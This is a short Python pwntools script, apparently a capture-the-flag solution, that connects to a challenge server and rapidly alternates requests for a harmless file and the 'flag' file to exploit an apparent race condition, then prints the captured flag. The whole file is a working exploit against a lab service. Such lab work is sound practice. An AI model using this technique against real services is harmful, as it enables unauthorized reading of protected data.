from pwn import *

# Connect to the challenge server
conn = remote('up.zoolab.org', 10931)
conn.recvuntil(b'to read it.\n')

# Send alternating inputs
for _ in range(8):
    conn.sendline(b'fortune001')
    conn.sendline(b'flag')

# Read all responses (with timeout)
output = conn.recvall(timeout=5).decode(errors='ignore')

# Print only the FLAG line
for line in output.splitlines():
    if "FLAG{" in line:
        print(line)
        break
